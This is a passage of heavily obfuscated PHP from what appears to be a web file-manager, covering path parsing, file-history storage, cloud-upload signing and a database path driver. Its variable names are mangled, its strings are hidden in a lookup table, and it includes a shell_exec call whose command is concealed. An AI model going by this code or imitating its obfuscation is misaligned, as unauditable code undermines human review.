get_path_this($ş³İ‚áŞ)); } public static function listData($¤¡èÀÉ”, $ç¸ø©Ÿæ = true) { $éñÁÎ =& $_SERVER[ê‘³Æ±]; if ($ç¸ø©Ÿæ && !IO::exist($¤¡èÀÉ”)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($¤¡èÀÉ”, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $ù²¤’­ø = self::pathHistory($¤¡èÀÉ”); $¢Ò¯«ÕÉ = array($éñÁÎ[1223] => $ù²¤’­ø . $éñÁÎ[1210], $éñÁÎ[1222] => rtrim(get_path_father($ù²¤’­ø), $éñÁÎ[8]) . $éñÁÎ[8], $éñÁÎ[366] => array()); $É ê“û¶ = IO::getContent($¢Ò¯«ÕÉ[$éñÁÎ[1223]]); if ($É ê“û¶) { $‚‡»ãÓ© = json_decode($É ê“û¶, !0); if (is_array($‚‡»ãÓ©)) { $¢Ò¯«ÕÉ[$éñÁÎ[366]] = $‚‡»ãÓ©; } } return $¢Ò¯«ÕÉ; } private static function saveData($˜ĞÖ“Ü¹, $É€Ûíô) { $½û§Ú§Š =& $_SERVER[ê‘³Æ±]; self::log($½û§Ú§Š[1226] . $˜ĞÖ“Ü¹ . $½û§Ú§Š[71] . count($É€Ûíô), $½û§Ú§Š[738]); if ($É€Ûíô) { return IO::setContent($˜ĞÖ“Ü¹, json_encode($É€Ûíô)); } $²ç¥ãÈ³ = IO::pathFather($˜ĞÖ“Ü¹); IO::remove($˜ĞÖ“Ü¹); self::clearEmptyFolder($²ç¥ãÈ³); return !0; } public static function clearEmptyFolder($ï¤ñÙâÛ) { $óÔ˜ĞŸİ =& $_SERVER[ê‘³Æ±]; if (trim($ï¤ñÙâÛ, $óÔ˜ĞŸİ[8]) == trim(self::$_historyBase, $óÔ˜ĞŸİ[8])) { return; } $ÃÏğö  = IO::pathFather($ï¤ñÙâÛ); $ô—”ƒÕ¿ = IO::has($ï¤ñÙâÛ, !0); if ($ô—”ƒÕ¿[$óÔ˜ĞŸİ[204]] > 0 || $ô—”ƒÕ¿[$óÔ˜ĞŸİ[205]] > 0) { return; } IO::remove($ï¤ñÙâÛ); self::clearEmptyFolder($ÃÏğö ); } private static function getBasePath() { $ø“úëÕÚ =& $_SERVER[ê‘³Æ±]; $èÄçÙ“ú = Model($ø“úëÕÚ[1227])->get($ø“úëÕÚ[1228]); if ($èÄçÙ“ú) { if (!IO::exist($èÄçÙ“ú)) { IO::mkdir($èÄçÙ“ú); } if (get_path_this($èÄçÙ“ú) == $ø“úëÕÚ[1213]) { $¨ì¬åµ = $ø“úëÕÚ[1229] . rand_string(8); @rename($èÄçÙ“ú, get_path_father($èÄçÙ“ú) . $ø“úëÕÚ[8] . $¨ì¬åµ); $èÄçÙ“ú = DATA_PATH . $¨ì¬åµ . $ø“úëÕÚ[8]; file_put_contents(DATA_PATH . $ø“úëÕÚ[1230], $ø“úëÕÚ[12]); Model($ø“úëÕÚ[1227])->set($ø“úëÕÚ[1228], $èÄçÙ“ú); } return $èÄçÙ“ú; } $èÄçÙ“ú = DATA_PATH . $ø“úëÕÚ[1229] . rand_string(8) . $ø“úëÕÚ[8]; $èÄçÙ“ú = IO::mkdir($èÄçÙ“ú); $èÄçÙ“ú = rtrim($èÄçÙ“ú, $ø“úëÕÚ[8]) . $ø“úëÕÚ[8]; file_put_contents($èÄçÙ“ú . $ø“úëÕÚ[1230], $ø“úëÕÚ[12]); file_put_contents(DATA_PATH . $ø“úëÕÚ[1230], $ø“úëÕÚ[12]); Model($ø“úëÕÚ[1227])->set($ø“úëÕÚ[1228], $èÄçÙ“ú); return $èÄçÙ“ú; } } class KodIO { const KOD_SOURCE = "\173\x73\157\x75\162\143\145\175"; const KOD_USER_RECYCLE = "\x7b\x75\x73\145\162\122\x65\143\x79\x63\x6c\x65\x7d"; const KOD_USER_FAV = "\x7b\x75\x73\x65\x72\106\141\x76\175"; const KOD_USER_FILE_TAG = "\x7b\165\x73\145\x72\106\151\154\x65\124\141\x67\x7d"; const KOD_USER_FILE_TYPE = "\173\x75\x73\x65\162\x46\x69\154\x65\x54\x79\160\145\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\162\157\165\160\x52\157\x6f\x74\x53\x65\154\146\175"; const KOD_USER_SHARE = "\173\165\x73\145\162\123\150\x61\x72\x65\x7d"; const KOD_USER_SHARE_LINK = "\173\165\163\145\162\x53\150\141\162\145\114\151\x6e\153\175"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\150\x61\162\145\x54\x6f\x4d\145\175"; const KOD_SHARE_ITEM = "\173\163\x68\x61\x72\x65\111\164\x65\155\175"; const KOD_SHARE_LINK = "\x7b\x73\x68\x61\162\x65\111\x74\145\x6d\114\x69\156\153\175"; const KOD_SEARCH = "\x7b\163\x65\x61\162\143\x68\x7d"; const KOD_BLOCK = "\x7b\142\154\157\143\153\175"; const KOD_IO = "\x7b\x69\x6f\175"; const KOD_USER_RECENT = "\173\165\163\x65\162\x52\x65\x6e\x63\x65\x6e\164\x7d"; const KOD_USER_DRIVER = "\x7b\x64\x72\151\166\x65\x72\x7d"; public static function typeList() { $¤‹‹Ò¯ô =& $_SERVER[ê‘³Æ±]; return array($¤‹‹Ò¯ô[1231] => self::KOD_SOURCE, $¤‹‹Ò¯ô[1232] => self::KOD_USER_RECYCLE, $¤‹‹Ò¯ô[1233] => self::KOD_USER_FAV, $¤‹‹Ò¯ô[1234] => self::KOD_USER_FILE_TAG, $¤‹‹Ò¯ô[1235] => self::KOD_USER_FILE_TYPE, $¤‹‹Ò¯ô[1236] => self::KOD_GROUP_ROOT_SELF, $¤‹‹Ò¯ô[1237] => self::KOD_USER_SHARE, $¤‹‹Ò¯ô[1238] => self::KOD_USER_SHARE_LINK, $¤‹‹Ò¯ô[1239] => self::KOD_USER_SHARE_TO_ME, $¤‹‹Ò¯ô[1240] => self::KOD_SHARE_ITEM, $¤‹‹Ò¯ô[1241] => self::KOD_SHARE_LINK, $¤‹‹Ò¯ô[1242] => self::KOD_SEARCH, $¤‹‹Ò¯ô[1243] => self::KOD_BLOCK, $¤‹‹Ò¯ô[1244] => self::KOD_IO, $¤‹‹Ò¯ô[1245] => self::KOD_USER_RECENT, $¤‹‹Ò¯ô[1246] => self::KOD_USER_DRIVER); } public static function parse($¯ù¬•) { $ŞúÆÙóÆ =& $_SERVER[ê‘³Æ±]; $¯ù¬• = self::clear($¯ù¬•); $·ªİĞõÍ = array_values(self::typeList()); preg_match($ŞúÆÙóÆ[1247], $¯ù¬•, $¯ŞÂ˜Äœ); $ùÚ…±öƒ = array($ŞúÆÙóÆ[416] => !1, $ŞúÆÙóÆ[1248] => !1, $ŞúÆÙóÆ[413] => !1, $ŞúÆÙóÆ[78] => $¯ù¬•, $ŞúÆÙóÆ[1157] => !1, $ŞúÆÙóÆ[1156] => $ŞúÆÙóÆ[12]); if (is_array($¯ŞÂ˜Äœ) && count($¯ŞÂ˜Äœ) == 5) { $§ˆûÜàÌ = $ŞúÆÙóÆ[1249] . $¯ŞÂ˜Äœ[2] . $ŞúÆÙóÆ[324]; if (in_array($§ˆûÜàÌ, $·ªİĞõÍ)) { $ùÚ…±öƒ[$ŞúÆÙóÆ[1157]] = $¯ŞÂ˜Äœ[1]; $ùÚ…±öƒ[$ŞúÆÙóÆ[33]] = $§ˆûÜàÌ; $ùÚ…±öƒ[$ŞúÆÙóÆ[1250]] = substr($§ˆûÜàÌ, 1, -1); $ùÚ…±öƒ[$ŞúÆÙóÆ[394]] = $¯ŞÂ˜Äœ[3]; } $ùÚ…±öƒ[$ŞúÆÙóÆ[1156]] = $¯ŞÂ˜Äœ[4]; } $õ£¦Á = array($ŞúÆÙóÆ[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $ùÚ…±öƒ[$ŞúÆÙóÆ[1212]] = in_array($ùÚ…±öƒ[$ŞúÆÙóÆ[33]], $õ£¦Á); return $ùÚ…±öƒ; } public static function isTruePath($õ¶¨×†¸) { $Ù¼ÍÓ¤‰ =& $_SERVER[ê‘³Æ±]; if (substr($õ¶¨×†¸, 0, 1) != $Ù¼ÍÓ¤‰[1249]) { return !0; } if (strpos($õ¶¨×†¸, $Ù¼ÍÓ¤‰[402]) === 0) { return !0; } if (strpos($õ¶¨×†¸, $Ù¼ÍÓ¤‰[1216]) === 0) { return !0; } if (strpos($õ¶¨×†¸, $Ù¼ÍÓ¤‰[1251]) === 0) { return !0; } if (strpos($õ¶¨×†¸, $Ù¼ÍÓ¤‰[1252]) === 0) { return !0; } if (strpos($õ¶¨×†¸, $Ù¼ÍÓ¤‰[1253]) === 0) { return !0; } return !1; } public static function clear($œİŸÑÉ) { $†²ƒ‰ş =& $_SERVER[ê‘³Æ±]; $œİŸÑÉ = str_replace(array($†²ƒ‰ş[1067], $†²ƒ‰ş[228]), $†²ƒ‰ş[53], $œİŸÑÉ); $œİŸÑÉ = str_replace($†²ƒ‰ş[98], $†²ƒ‰ş[8], $œİŸÑÉ); $­Ï¦Ùş = $†²ƒ‰ş[1254]; if (substr($œİŸÑÉ, 0, 3) == $†²ƒ‰ş[1255]) { $œİŸÑÉ = substr($œİŸÑÉ, 3); } while (strstr($œİŸÑÉ, $­Ï¦Ùş)) { $œİŸÑÉ = str_replace($­Ï¦Ùş, $†²ƒ‰ş[8], $œİŸÑÉ); } $œİŸÑÉ = preg_replace($†²ƒ‰ş[1256], $†²ƒ‰ş[8], $œİŸÑÉ); if ($œİŸÑÉ == $†²ƒ‰ş[8]) { return $†²ƒ‰ş[8]; } $œİŸÑÉ = rtrim($œİŸÑÉ, $†²ƒ‰ş[8]); return $œİŸÑÉ; } public static function sourceID($Ò£‰¸¼) { $Ñ„Ù¤Òİ =& $_SERVER[ê‘³Æ±]; $éÚ»®ê¨ = self::parse($Ò£‰¸¼); if ($éÚ»®ê¨[$Ñ„Ù¤Òİ[33]] !== self::KOD_SOURCE) { show_json(LNG($Ñ„Ù¤Òİ[1257]), !1); } return $éÚ»®ê¨[$Ñ„Ù¤Òİ[394]]; } public static function make($ÀÈ·µĞş) { if (!$ÀÈ·µĞş) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ÀÈ·µĞş)); } public static function makeShare($Š¬äƒ•å, $‹”®½Ãê) { return self::makePath(self::KOD_SHARE_ITEM, $Š¬äƒ•å, $‹”®½Ãê); } public static function makeFileTypePath($§úä÷íÒ) { return self::makePath(self::KOD_USER_FILE_TYPE, $§úä÷íÒ); } public static function makeFileTagPath($¤íäúğ ) { return self::makePath(self::KOD_USER_FILE_TAG, $¤íäúğ ); } public static function makePath($ÓŸ›ÄÕ, $æŠ„ñÆ = '', $êŞËŒÂ = '') { $Š×ÆÌ‚ß =& $_SERVER[ê‘³Æ±]; $’Ä«–Ëé = substr($ÓŸ›ÄÕ, 1, -1); $Î™éñé¢ = $Š×ÆÌ‚ß[1258] . $’Ä«–Ëé . $Š×ÆÌ‚ß[1259] . $æŠ„ñÆ . $Š×ÆÌ‚ß[1260]; $Î™éñé¢ = $êŞËŒÂ ? $Î™éñé¢ . $êŞËŒÂ . $Š×ÆÌ‚ß[8] : $Î™éñé¢; return $Î™éñé¢; } public static function hashPath($Ğó‡ˆ, $¿®†¬ = true) { $÷—™¿—ô =& $_SERVER[ê‘³Æ±]; $õÉè™Ğ‡ = is_array($Ğó‡ˆ) ? $Ğó‡ˆ : IO::info($Ğó‡ˆ); $¹¡¨ñ‘ = _get($õÉè™Ğ‡, $÷—™¿—ô[1261], $÷—™¿—ô[12]); if (!$¹¡¨ñ‘ && isset($õÉè™Ğ‡[$÷—™¿—ô[396]])) { $õÉè™Ğ‡ = IO::info(KodIO::make($õÉè™Ğ‡[$÷—™¿—ô[396]])); $¹¡¨ñ‘ = _get($õÉè™Ğ‡, $÷—™¿—ô[1261], $÷—™¿—ô[12]); } if (!$¹¡¨ñ‘ && $¿®†¬) { $Ó™ïÔÉ = KodIO::parse($õÉè™Ğ‡[$÷—™¿—ô[78]]); if (!$Ó™ïÔÉ[$÷—™¿—ô[33]]) { $¹¡¨ñ‘ = IO::hashSimple($õÉè™Ğ‡[$÷—™¿—ô[78]]); } } if (!$¹¡¨ñ‘) { $¹¡¨ñ‘ = md5($õÉè™Ğ‡[$÷—™¿—ô[78]] . $õÉè™Ğ‡[$÷—™¿—ô[80]] . $õÉè™Ğ‡[$÷—™¿—ô[86]]); } return $¹¡¨ñ‘; } public static function initSystemPath() { $‹óÜ€„ï =& $_SERVER[ê‘³Æ±]; if (defined($‹óÜ€„ï[1262])) { return; } define($‹óÜ€„ï[1262], self::systemPath($‹óÜ€„ï[1263])); define($‹óÜ€„ï[1264], self::systemPath($‹óÜ€„ï[1265])); define($‹óÜ€„ï[1266], self::systemPath($‹óÜ€„ï[1267])); define($‹óÜ€„ï[1268], self::systemPath($‹óÜ€„ï[1269])); IOHistory::bindEvent(); } public static function systemPath($«»¦è¤…) { $ÃÛÑşÎÈ =& $_SERVER[ê‘³Æ±]; $¿îÁôÉ— = $ÃÛÑşÎÈ[1270] . ucfirst($«»¦è¤…); $õ—ïğ“· = Model($ÃÛÑşÎÈ[756])->get($¿îÁôÉ—); if ($õ—ïğ“·) { return $õ—ïğ“·; } if ($«»¦è¤… == $ÃÛÑşÎÈ[1263]) { $õ—ïğ“· = self::make(Model($ÃÛÑşÎÈ[819])->systemRootPathAdd($ÃÛÑşÎÈ[533])); } else { $õ—ïğ“· = self::systemPath($ÃÛÑşÎÈ[1263]); $ı•ıÚò = self::sourceID($õ—ïğ“·); $õ—ïğ“· = self::make(Model($ÃÛÑşÎÈ[819])->mkdir($ı•ıÚò, $«»¦è¤…)); } Model($ÃÛÑşÎÈ[756])->set($¿îÁôÉ—, $õ—ïğ“·); return $õ—ïğ“·; } public static function systemFolder($½ÜùäÒè) { $“†Ö‚À = IO_PATH_SYSTEM_SOURCE . $½ÜùäÒè; $«ü²Â‹œ = Cache::get($“†Ö‚À); if (!$«ü²Â‹œ) { $ñÙ«ôÉ’ = IO::infoFull($“†Ö‚À); if (!$ñÙ«ôÉ’) { $«ü²Â‹œ = IO::mkdir($“†Ö‚À, REPEAT_SKIP); } else { $«ü²Â‹œ = $ñÙ«ôÉ’[$_SERVER[ê‘³Æ±][78]]; } Cache::set($“†Ö‚À, $«ü²Â‹œ, 3600 * 10); } return $«ü²Â‹œ; } public static function defaultDriver() { return Model($_SERVER[ê‘³Æ±][753])->defaultDriver(); } public static function defaultIO() { $Àƒ¡³ˆı =& $_SERVER[ê‘³Æ±]; $Ë“ó¹…ª = self::defaultDriver(); return $Àƒ¡³ˆı[1271] . $Ë“ó¹…ª[$Àƒ¡³ˆı[394]] . $Àƒ¡³ˆı[1260]; } public static function defaultDriverInit() { static $ÏÉ©åİÁ = false; if ($ÏÉ©åİÁ) { return $ÏÉ©åİÁ; } $ÏÉ©åİÁ = IO::init(self::defaultIO()); return $ÏÉ©åİÁ; } public static function fileTypeList() { $§«ÌÎÕ¡ =& $_SERVER[ê‘³Æ±]; $‡ØŒò™´ = $GLOBALS[$§«ÌÎÕ¡[6]][$§«ÌÎÕ¡[1272]]; foreach ($‡ØŒò™´ as $­©øï¦ˆ => $ó‡í¸àÂ) { $ÍÉ»‚è = $§«ÌÎÕ¡[1273] . $­©øï¦ˆ; $œÄî€Æ‰ = LNG($ÍÉ»‚è); if ($ÍÉ»‚è != $œÄî€Æ‰) { $‡ØŒò™´[$­©øï¦ˆ][$§«ÌÎÕ¡[32]] = $œÄî€Æ‰; } } return $‡ØŒò™´; } public static function diskList($û˜»µ = true) { $ÛÊªÆ›ä = $_SERVER[ê‘³Æ±][1274]; if ($û˜»µ) { $•¹ÍÅÖ¯ = Cache::get($ÛÊªÆ›ä); if (is_array($•¹ÍÅÖ¯)) { return $•¹ÍÅÖ¯; } } $•¹ÍÅÖ¯ = self::diskListGet(); Cache::set($ÛÊªÆ›ä, $•¹ÍÅÖ¯, 60); return $•¹ÍÅÖ¯; } public static function diskListGet() { $Øßæàø‰ =& $_SERVER[ê‘³Æ±]; $ïåÕ = array(); if ($GLOBALS[$Øßæàø‰[6]][$Øßæàø‰[1275]] == $Øßæàø‰[1276]) { $Ÿ³òÊ’Ï = $Øßæàø‰[1277]; for ($ÀÀÖü€İ = 0; $ÀÀÖü€İ < strlen($Ÿ³òÊ’Ï); $ÀÀÖü€İ++) { $‰˜¼„Ç = $Ÿ³òÊ’Ï[$ÀÀÖü€İ] . $Øßæàø‰[1278]; if (file_exists($‰˜¼„Ç)) { $ïåÕ[] = $‰˜¼„Ç; } } return $ïåÕ; } if (!function_exists($Øßæàø‰[99])) { $ïåÕ[] = $Øßæàø‰[829]; return $ïåÕ; } $¤ÏôÚÆØ = explode($Øßæàø‰[228], shell_exec($Øßæàø‰[1279])); array_shift($¤ÏôÚÆØ); array_pop($¤ÏôÚÆØ); $ˆù‹êÍÉ = array($Øßæàø‰[1280], $Øßæàø‰[1281], $Øßæàø‰[1282], $Øßæàø‰[1283], $Øßæàø‰[1284], $Øßæàø‰[1285], $Øßæàø‰[1286], $Øßæàø‰[1287]); foreach ($¤ÏôÚÆØ as $ª˜üªë¢) { $°»ğÙÕ¢ = preg_split($Øßæàø‰[1288], $ª˜üªë¢); $‰˜¼„Ç = $°»ğÙÕ¢[count($°»ğÙÕ¢) - 1]; if (!strstr($°»ğÙÕ¢[0], $Øßæàø‰[1289]) || !$‰˜¼„Ç) { continue; } $–…¦€†ë = rtrim($‰˜¼„Ç, $Øßæàø‰[8]) . $Øßæàø‰[8]; if (in_array($–…¦€†ë, $ˆù‹êÍÉ)) { continue; } $ïåÕ[] = $–…¦€†ë; } return $ïåÕ; } public static function isSameDisk($Å¡¥Úœ, $ô–¨¦¬ú) { $œÄÛ­Àä =& $_SERVER[ê‘³Æ±]; if ($GLOBALS[$œÄÛ­Àä[6]][$œÄÛ­Àä[1275]] == $œÄÛ­Àä[1276]) { return strtolower(substr($Å¡¥Úœ, 0, 1)) == strtolower(substr($ô–¨¦¬ú, 0, 1)); } $¦œ×•ˆ¨ = self::diskList(); $ÑÙş°±Ÿ = !1; $ÂØ€ÙØ = !1; sort($¦œ×•ˆ¨); $¦œ×•ˆ¨ = array_reverse($¦œ×•ˆ¨); $Å¡¥Úœ = rtrim($Å¡¥Úœ, $œÄÛ­Àä[8]) . $œÄÛ­Àä[8]; $ô–¨¦¬ú = rtrim($ô–¨¦¬ú, $œÄÛ­Àä[8]) . $œÄÛ­Àä[8]; foreach ($¦œ×•ˆ¨ as $²ùá”³Ì) { $É¹™óö’ = strlen($²ùá”³Ì); if (!$ÑÙş°±Ÿ && substr($Å¡¥Úœ, 0, $É¹™óö’) == $²ùá”³Ì) { $ÑÙş°±Ÿ = $²ùá”³Ì; } if (!$ÂØ€ÙØ && substr($ô–¨¦¬ú, 0, $É¹™óö’) == $²ùá”³Ì) { $ÂØ€ÙØ = $²ùá”³Ì; } if ($ÑÙş°±Ÿ && $ÂØ€ÙØ) { break; } } return $ÑÙş°±Ÿ === $ÂØ€ÙØ; } public static function transferType($™ÉÏû¯Í, $½ÄµçÊ) { $ğŞíËï =& $_SERVER[ê‘³Æ±]; $Ø×ª€¼ = self::driverType($™ÉÏû¯Í); $ùåİ˜àü = self::driverType($½ÄµçÊ); if ($Ø×ª€¼[$ğŞíËï[33]] == $ùåİ˜àü[$ğŞíËï[33]] && $Ø×ª€¼[$ğŞíËï[1290]] == $ùåİ˜àü[$ğŞíËï[1290]]) { return $ğŞíËï[1291]; } if ($Ø×ª€¼[$ğŞíËï[33]] == $ğŞíËï[858] && $ùåİ˜àü[$ğŞíËï[33]] == $ğŞíËï[107]) { return $ğŞíËï[1186]; } if ($Ø×ª€¼[$ğŞíËï[33]] == $ğŞíËï[107] && $ùåİ˜àü[$ğŞíËï[33]] == $ğŞíËï[858]) { return $ğŞíËï[108]; } return $ğŞíËï[1292]; } public static function driverType($º¿›¯©Ì) { $Ôş³ú¯ú =& $_SERVER[ê‘³Æ±]; $“½ûùÎö = str_replace($Ôş³ú¯ú[1293], $Ôş³ú¯ú[12], strtolower($º¿›¯©Ì->getType())); if ($“½ûùÎö == $Ôş³ú¯ú[744] || $“½ûùÎö == $Ôş³ú¯ú[1294] || $“½ûùÎö == $Ôş³ú¯ú[1295]) { $º¿›¯©Ì = self::defaultDriverInit(); } else { if ($“½ûùÎö == $Ôş³ú¯ú[1193] || $“½ûùÎö == $Ôş³ú¯ú[1296]) { $º¿›¯©Ì = IO::init($º¿›¯©Ì->pathParse[$Ôş³ú¯ú[1140]]); } } $ÈâÏı = $º¿›¯©Ì->path; $“½ûùÎö = str_replace($Ôş³ú¯ú[1293], $Ôş³ú¯ú[12], strtolower($º¿›¯©Ì->getType())); if ($“½ûùÎö == $Ôş³ú¯ú[107]) { return array($Ôş³ú¯ú[33] => $Ôş³ú¯ú[107], $Ôş³ú¯ú[1290] => $Ôş³ú¯ú[12], $Ôş³ú¯ú[78] => $ÈâÏı); } return array($Ôş³ú¯ú[33] => $Ôş³ú¯ú[858], $Ôş³ú¯ú[1290] => $º¿›¯©Ì->pathDriver, $Ôş³ú¯ú[78] => $ÈâÏı); } public static function pathDriverType($ˆÀÙÆÒ) { return $ˆÀÙÆÒ ? self::driverType(IO::init($ˆÀÙÆÒ)) : !1; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($…ıóÖ) { parent::__construct($…ıóÖ); $this->signatureVersion($_SERVER[ê‘³Æ±][213]); } public function uploadFormData($«ûâéµ†, $ù“Â´‰ = 3600) { $Şïµ‚ =& $_SERVER[ê‘³Æ±]; $’‘†İş¥ = $Şïµ‚[193]; $ï“õèı£ = $Şïµ‚[229]; $Ü½üüú´ = $Şïµ‚[1297]; $ÕØûïÑ¸ = gmdate($Şïµ‚[1298], time() + $ù“Â´‰); $¶ÉßÏÚù = (string) time() . $Şïµ‚[71] . (string) (time() + $ù“Â´‰); $å¢Åİ¹ = array($Şïµ‚[1299] => $ÕØûïÑ¸, $Şïµ‚[1300] => array(array($Şïµ‚[1301] => $’‘†İş¥), array($Şïµ‚[1302] => $this->bucket), array($Şïµ‚[1303], $Şïµ‚[1304], $Şïµ‚[12]), array($Şïµ‚[1305] => $Ü½üüú´), array($Şïµ‚[1306] => $ï“õèı£), array($Şïµ‚[1307] => $this->accessKey), array($Şïµ‚[1308] => $¶ÉßÏÚù))); $å¢Åİ¹ = json_encode($å¢Åİ¹); $¡å§ = hash_hmac($Şïµ‚[229], $¶ÉßÏÚù, $this->secret); $†Š‘ú‹• = sha1($å¢Åİ¹); $Ìı‰¦Ø« = hash_hmac($Şïµ‚[229], $†Š‘ú‹•, $¡å§); $´Ö€›ê = array($Şïµ‚[1301] => $’‘†İş¥, $Şïµ‚[1305] => $Ü½üüú´, $Şïµ‚[1309] => base64_encode($å¢Åİ¹), $Şïµ‚[1306] => $ï“õèı£, $Şïµ‚[1307] => $this->accessKey, $Şïµ‚[1310] => $¶ÉßÏÚù, $Şïµ‚[1311] => $Ìı‰¦Ø«, $Şïµ‚[176] => $this->getHost()); return $´Ö€›ê; } public function fileOutLink($²Ïğîí½) { $ƒ–Äûè =& $_SERVER[ê‘³Æ±]; if (substr($²Ïğîí½, 0, 7) == $ƒ–Äûè[1312]) { $²Ïğîí½ = $ƒ–Äûè[1313] . substr($²Ïğîí½, 7); } header($ƒ–Äûè[160] . $²Ïğîí½); die; } } goto cÒ‘Ôªõ„ù; cÒ‘Ôªõ„ù: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($ëúÍ§­®) { $this->pathParse = $ëúÍ§­®; $this->model = Model($_SERVER[ê‘³Æ±][1314]); } public function getPath($’Ğ„Îİğ) { return trim($’Ğ„Îİğ, $_SERVER[ê‘³Æ±][8]); } public function pathFather($áñ£¬Øï) { $ÜßØÊÖ× = $this->parse($áñ£¬Øï); $ÜßØÊÖ× = $this->infoSimple($áñ£¬Øï); return $ÜßØÊÖ× ? $ÜßØÊÖ×[$_SERVER[ê‘³Æ±][491]] : !1; } public function pathThis($ş‰µíïŞ) { $è¤„£ŒÎ = $this->infoSimple($ş‰µíïŞ); return $è¤„£ŒÎ ? $è¤„£ŒÎ[$_SERVER[ê‘³Æ±][32]] : !1; } public function getPathOuter($šñ”œ…à) { if (!$šñ”œ…à) { return $šñ”œ…à; } $÷“šˆ¢¤ = $this->parse($šñ”œ…à); return KodIO::make($÷“šˆ¢¤[$_SERVER[ê‘³Æ±][394]]); } public function copyFolderFromIO($ƒĞş¬¡Ñ, $˜’ÌÜŸû, $ÂÀÇ ÜÛ, $ØÄŒ›Î†, $ÊÙÄÈà©) { $ÀÆ¬ğ¼Ï = $this->model->copyFolderFromIO($ƒĞş¬¡Ñ, $˜’ÌÜŸû, $ÂÀÇ ÜÛ, $ØÄŒ›Î†, $ÊÙÄÈà©); return KodIO::make($ÀÆ¬ğ¼Ï); } public function isParentOf($¸İ¬Ÿ·‡, $íÊÍÔõ) { return $this->model->isParentOf($¸İ¬Ÿ·‡, $íÊÍÔõ); } public function mkfile($ˆĞĞõû, $µÏêˆşÅ = '', $¯êğˆò÷ = REPEAT_RENAME) { $İ»…ÅŞ­ =& $_SERVER[ê‘³Æ±]; $üº¼ßæ = $this->parse($ˆĞĞõû); $ˆĞĞõû = $üº¼ßæ[$İ»…ÅŞ­[394]]; for ($Ø¬¤ñû£ = 0; $Ø¬¤ñû£ < count($üº¼ßæ[$İ»…ÅŞ­[1315]]); $Ø¬¤ñû£++) { $İÇ“Úœ˜ = $üº¼ßæ[$İ»…ÅŞ­[1315]][$Ø¬¤ñû£]; if ($Ø¬¤ñû£ == count($üº¼ßæ[$İ»…ÅŞ­[1315]]) - 1) { $ˆĞĞõû = $this->model->mkfile($ˆĞĞõû, $İÇ“Úœ˜, $µÏêˆşÅ, $¯êğˆò÷); break; } $ˆĞĞõû = $this->model->mkdir($ˆĞĞõû, $İÇ“Úœ˜, REPEAT_SKIP); } return $this->getPathOuter($ˆĞĞõû); } public function mkdir($ö°”Ë¥, $ò£Ê¡— = REPEAT_SKIP) { $»û©£Ó =& $_SERVER[ê‘³Æ±]; $Ÿ‘ä×› = $this->parse($ö°”Ë¥); $ö°”Ë¥ = $Ÿ‘ä×›[$»û©£Ó[394]]; for ($±±‚‰ŞŸ = 0; $±±‚‰ŞŸ < count($Ÿ‘ä×›[$»û©£Ó[1315]]); $±±‚‰ŞŸ++) { $Îå…ñŸË = $Ÿ‘ä×›[$»û©£Ó[1315]][$±±‚‰ŞŸ]; $ö°”Ë¥ = $this->model->mkdir($ö°”Ë¥, $Îå…ñŸË, $ò£Ê¡—); } return $this->getPathOuter($ö°”Ë¥); } public function copyFile($ºäïÖÜ, $î³È£à×, $Ãëá¿˜ = REPEAT_REPLACE) { $·¥Ö»¹¤ =& $_SERVER[ê‘³Æ±]; $Â‰õ‹ª = $this->parse($î³È£à×); $æ‹‰Ú˜˜ = $this->model->copy($ºäïÖÜ, $Â‰õ‹ª[$·¥Ö»¹¤[394]], $Ãëá¿˜, $Â‰õ‹ª[$·¥Ö»¹¤[78]]); return $æ‹‰Ú˜˜ ? $this->getPathOuter($æ‹‰Ú˜˜) : !1; } public function moveFile($÷—Ş–É, $Üõ ø‘¸, $óÊ£¤ŠĞ = REPEAT_REPLACE) { $¨Ïûƒ¸ƒ =& $_SERVER[ê‘³Æ±]; $ïü‡¥ôÚ = $this->parse($Üõ ø‘¸); $°Ÿ·Ã¡Ş = $this->model->move($÷—Ş–É, $ïü‡¥ôÚ[$¨Ïûƒ¸ƒ[394]], $óÊ£¤ŠĞ, $ïü‡¥ôÚ[$¨Ïûƒ¸ƒ[78]]); return $°Ÿ·Ã¡Ş ? $this->getPathOuter($°Ÿ·Ã¡Ş) : !1; } public function copy($½¿¡áù§, $î Ï‚–›, $Í¯½‰‡œ = REPEAT_REPLACE, $°½ÎùŞá = false) { $ÍóÑèÜ = $this->parse($î Ï‚–›); $îÚíŸŠ£ = $this->model->copy($½¿¡áù§, $ÍóÑèÜ[$_SERVER[ê‘³Æ±][394]], $Í¯½‰‡œ, $°½ÎùŞá); return $îÚíŸŠ£ ? $this->getPathOuter($îÚíŸŠ£) : !1; } public function moveSameAllow() { } public function move($Ú²½ıíé, $úÉ½ñŸ, $ï™¼“Õû = REPEAT_REPLACE, $™†ÖÜ‚ˆ = false) { $ô¥ıã = $this->parse($úÉ½ñŸ); $Ş«è‰üÎ = $this->model->move($Ú²½ıíé, $ô¥ıã[$_SERVER[ê‘³Æ±][394]], $ï™¼“Õû, $™†ÖÜ‚ˆ); return $Ş«è‰üÎ ? $this->getPathOuter($Ş«è‰üÎ) : !1; } public function remove($é‚ğêøñ, $Ü„°¯Ö¶ = true) { return $this->model->remove($é‚ğêøñ, $Ü„°¯Ö¶); } public function rename($ø„ÇÕ», $–ÄùÚİÇ) { $ªû“Í¶Ô = $this->model->rename($ø„ÇÕ», $–ÄùÚİÇ); return $ªû“Í¶Ô ? $this->getPathOuter($ø„ÇÕ») : $ªû“Í¶Ô; } public function size($ÛÎ¬·õ¤) { $á×£›šŸ = $this->infoSimple($ÛÎ¬·õ¤); return $á×£›šŸ ? $á×£›šŸ[$_SERVER[ê‘³Æ±][80]] : 0; } public function infoSimple($Éİ•–‰) { return $this->model->sourceInfo($Éİ•–‰); } public function info($Ÿü‰í€) { return $this->infoParse($Ÿü‰í€); } public function infoAuth($Ö£æ¬ø¨) { return $this->infoParse($Ö£æ¬ø¨, !1, !0); } public function infoWithChildren($šÏàÏÂô) { return $this->infoParse($šÏàÏÂô, !0); } protected function infoParse($¥¥‡ëÒ, $ÉíÓÇÅõ = false, $ÑÉÛ¤Â = false) { if 